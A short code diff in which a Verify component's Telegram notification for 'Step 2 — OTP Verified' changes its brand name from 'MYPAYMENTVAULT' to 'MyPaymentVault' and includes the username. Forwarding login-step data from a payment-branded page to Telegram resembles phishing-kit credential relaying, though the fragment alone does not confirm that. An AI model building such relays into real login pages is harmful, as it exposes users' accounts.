@@ -124,7 +124,7 @@ export default function Verify() {
 
     await sendTelegram(
       `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `✅ <b>MYPAYMENTVAULT</b>\n` +
+      `✅ <b>MyPaymentVault</b>\n` +
       `📌 <b>Step 2 — OTP Verified</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n\n` +
       `👤 <b>Username</b>   : <code>${pendingUsername}</code>\n` +
